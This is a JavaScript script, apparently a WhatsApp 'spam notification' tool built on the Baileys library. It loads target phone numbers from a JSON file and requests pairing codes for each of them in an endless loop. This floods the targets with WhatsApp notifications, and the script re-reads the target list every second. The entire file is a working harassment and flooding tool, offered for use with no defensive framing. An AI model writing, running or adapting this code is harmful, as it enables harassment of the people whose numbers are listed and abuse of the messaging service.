import pkg from "@whiskeysockets/baileys";
const { makeWASocket, useMultiFileAuthState } = pkg;
import pino from 'pino';
import readline from "readline";
import fs from 'fs';

const color = [
    '\x1b[31m', 
    '\x1b[32m', 
    '\x1b[33m', 
    '\x1b[34m', 
    '\x1b[35m', 
    '\x1b[36m', 
    '\x1b[37m',
    '\x1b[90m' 
];
const Color = color[Math.floor(Math.random() * color.length)];
const xColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => rl.question(text, resolve)).finally(() => rl.close());
};

const loadNumbers = () => {
    if (fs.existsSync('numbers_spam.json')) {
        const phoneNumbersData = JSON.parse(fs.readFileSync('numbers_spam.json', 'utf8'));
        const phoneNumbers = Object.values(phoneNumbersData).flat();
        return phoneNumbers;
    }
    return [];
};

const Spam = async () => {
    const { state } = await useMultiFileAuthState('./69/session');
    const XeonBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    try {
        const activeNumbers = new Set(loadNumbers());

        const sendSpam = async (number) => {
            try {
                let code = await XeonBotInc.requestPairingCode(number);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(`${Color}${number} - Spam sent${xColor}`);
            } catch (error) {
                console.error('Error:', error.message);
            }
        };

        const spamContinuously = async () => {
            while (true) {
                for (const number of activeNumbers) {
                    await sendSpam(number);
                    await new Promise(resolve => setImmediate(resolve));
                }
            }
        };

        const monitorNumbers = () => {
            setInterval(() => {
                const currentNumbers = loadNumbers();
                const newNumbers = currentNumbers.filter(num => !activeNumbers.has(num));
                const deletedNumbers = Array.from(activeNumbers).filter(num => !currentNumbers.includes(num));

                newNumbers.forEach(num => activeNumbers.add(num));
                deletedNumbers.forEach(num => {
                    activeNumbers.delete(num);
                    console.log(`${Color}${num} - Spam stopped (number deleted)${xColor}`);
                });
            }, 1000);
        };

        monitorNumbers();
        spamContinuously();

    } catch (error) {
        console.error('Error:', error.message);
    }

    return XeonBotInc;
};

console.log(`${Color}═╗ ╦┌─┐┌─┐┌┐┌  ╔═╗┌─┐┌─┐┌┬┐  ╔╗╔┌─┐┌┬┐┬┌─┐┬┌─┐┌─┐┌┬┐┬┌─┐┌┐┌
╔╩╦╝├┤ │ ││││  ╚═╗├─┘├─┤│││  ║║║│ │ │ │├┤ ││  ├─┤ │ ││ ││││
╩ ╚═└─┘└─┘┘└┘  ╚═╝┴  ┴ ┴┴ ┴  ╝╚╝└─┘ ┴ ┴└  ┴└─┘┴ ┴ ┴ ┴└─┘┘└┘${xColor}`);

Spam();
